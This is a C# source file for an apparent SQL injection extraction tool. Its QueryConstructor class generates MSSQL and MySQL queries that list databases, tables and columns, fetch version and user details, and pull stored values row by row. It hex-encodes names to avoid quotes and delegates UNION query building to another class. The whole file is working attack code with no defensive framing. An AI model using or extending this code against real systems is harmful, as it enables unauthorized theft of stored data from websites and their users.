using System;
using System.Collections.Generic;
using System.Text;

namespace Sql_Database_Extraction
{
    class QueryConstructor
    {

        public QueryConstructor()
        {
        }

        public List<string> getUnionQueries(int minColumns, int maxColumns, eDataBase DatabaseType)
        {
            UnionQueryConstructor UQC = new UnionQueryConstructor();
            return UQC.createQueries(minColumns, maxColumns, DatabaseType);
        }

        public string DBGetVersion(eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "@@VERSION";
            else
                return "VERSION()";
        }

        public string DBGetDatabase(eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "DB_NAME()";
            else
                return "DATABASE()";
        }

        public string DBGetUser(eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SYSTEM_USER";
            else
                return "CURRENT_USER()";
        }

        public string GetDatarowValue(string DatabaseName, string TabellenName, string FeldName, int Row, string OrderBySpalte, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT TOP 1 CAST(" + FeldName + " as varchar) FROM (SELECT TOP " + Convert.ToString(1 + Row) + " * FROM " + DatabaseName + ".." + TabellenName + " ORDER BY " + OrderBySpalte + ") AS newTable ORDER BY " + OrderBySpalte + " DESC";
            else
                return "SELECT " + FeldName + " FROM " + DatabaseName + "." + TabellenName + " ORDER BY " + OrderBySpalte + " LIMIT " + Row.ToString() + ", 1";
        }

        public string GetDatarowsLength(string DatabaseName, string TabellenName, string FeldName, int Row, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT TOP 1 CAST(LEN(CAST(" + FeldName + " as varchar)) as varchar) FROM (SELECT TOP " + Convert.ToString(1 + Row) + " * FROM " + DatabaseName + ".." + TabellenName + " ORDER BY " + FeldName + ") AS newTable ORDER BY " + FeldName + " DESC";
            else
                return "SELECT LENGTH(" + FeldName + ") FROM " + DatabaseName + "." + TabellenName + " ORDER BY " + TabellenName + " LIMIT " + Row.ToString() + ", 1";
        }

        public string GetDatarowsCount(string DatabaseName, string TabellenName, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT LTRIM(STR(COUNT(*))) FROM " + DatabaseName + ".." + TabellenName + "";
            else
                return "SELECT COUNT(*) FROM " + DatabaseName + "." + TabellenName;
        }

        public string GetFeldTypQuery(string DatabaseName, string TabellenName, string FeldName, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT data_type FROM " + DatabaseName + ".information_schema.columns WHERE " + DatabaseName + ".information_schema.columns.column_name=CAST(0x" + StringToHex(FeldName) + " AS VARCHAR) AND " + DatabaseName + ".information_schema.columns.table_name=CAST(0x" + StringToHex(TabellenName) + " AS VARCHAR)";
            else
                return "SELECT data_type FROM information_schema.COLUMNS WHERE table_name=CONCAT(0x" + StringToHex(TabellenName) + ") AND column_name=CONCAT(0x" + StringToHex(FeldName) + ") AND table_schema=CONCAT(0x" + StringToHex(DatabaseName) + ")";
        }

        public string GetFeldNamenQuery(string DatabaseName, string TabellenName, int FeldIndex, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT TOP 1 column_name FROM " + DatabaseName + ".information_schema.columns, " + DatabaseName + ".information_schema.tables WHERE " + DatabaseName + ".information_schema.columns.table_name=CAST(0x" + StringToHex(TabellenName) + " AS VARCHAR) AND " + DatabaseName + ".information_schema.columns.table_name=" + DatabaseName + ".information_schema.tables.table_name AND " + DatabaseName + ".information_schema.tables.table_type=CAST(0x42415345205441424c45 AS VARCHAR) AND column_name NOT IN (SELECT TOP " + FeldIndex + " column_name FROM " + DatabaseName + ".information_schema.columns, " + DatabaseName + ".information_schema.tables WHERE " + DatabaseName + ".information_schema.columns.table_name=CAST(0x" + StringToHex(TabellenName) + " AS VARCHAR) AND " + DatabaseName + ".information_schema.columns.table_name=" + DatabaseName + ".information_schema.tables.table_name AND " + DatabaseName + ".information_schema.tables.table_type=CAST(0x42415345205441424c45 AS VARCHAR) ORDER BY column_name) ORDER BY column_name";
            else
                return "SELECT column_name FROM information_schema.COLUMNS WHERE table_name=CONCAT(0x" + StringToHex(TabellenName) + ") AND table_schema=CONCAT(0x" + StringToHex(DatabaseName) + ") LIMIT " + FeldIndex.ToString() + ", 1";
        }

        public string GetFeldAnzahlQuery(string DatabaseName, string TabellenName, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT LTRIM(STR(COUNT(column_name))) FROM " + DatabaseName + ".information_schema.columns, " + DatabaseName + ".information_schema.tables WHERE " + DatabaseName + ".information_schema.columns.table_name=Cast(0x" + StringToHex(TabellenName) + " as VARCHAR) AND " + DatabaseName + ".information_schema.columns.table_name=" + DatabaseName + ".information_schema.tables.table_name AND " + DatabaseName + ".information_schema.tables.table_type=CAST(0x42415345205441424c45 AS VARCHAR)";
            else
                return "SELECT COUNT(column_name) FROM information_schema.COLUMNS WHERE table_name=CONCAT(0x" + StringToHex(TabellenName) + ") AND table_schema=CONCAT(0x" + StringToHex(DatabaseName) + ")";
        }


        public string GetTabellenNamenQuery(string DatabaseName, int TabellenIndex, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT TOP 1 table_name FROM " + DatabaseName + ".information_schema.tables WHERE table_type=CAST(0x42415345205441424c45 AS VARCHAR) AND table_name NOT IN (SELECT TOP " + TabellenIndex.ToString() + " table_name FROM " + DatabaseName + ".information_schema.tables WHERE table_type=CAST(0x42415345205441424c45 AS VARCHAR) ORDER BY table_name) ORDER BY table_name";
            else
                return "SELECT table_name FROM information_schema.TABLES WHERE table_schema=CONCAT(0x" + StringToHex(DatabaseName) + ") LIMIT " + TabellenIndex.ToString() + ", 1";
        }

        public string TabellenAnzahl(string DatabaseName, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT LTRIM(STR(COUNT(table_name))) FROM " + DatabaseName + ".information_schema.tables WHERE table_type=CAST(0x42415345205441424c45 AS VARCHAR)";
            else
                return "SELECT COUNT(table_name) FROM information_schema.TABLES WHERE table_schema=CONCAT(0x" + StringToHex(DatabaseName) + ")";
        }

        public string GetDatabaseCountQuery(eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases";
            else
                return "SELECT COUNT(schema_name) FROM information_schema.SCHEMATA";
        }

        public string GetDatabaseNameQuery(eDataBase DBType, int DBIndex)
        {
            if (DBType == eDataBase.MSSQL)
                return "SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP " + DBIndex.ToString() + " name FROM master..sysdatabases ORDER BY name)";
            else
                return "SELECT schema_name FROM information_schema.SCHEMATA LIMIT " + DBIndex.ToString() + ", 1";
        }

        private string StringToHex(string Hexstring)
        {
            StringBuilder SB = new StringBuilder();
            for (int i = 0; i < Hexstring.Length; i++)
                SB.Append(Convert.ToInt32(Hexstring[i]).ToString("x"));
            return SB.ToString();
        }
    }
}
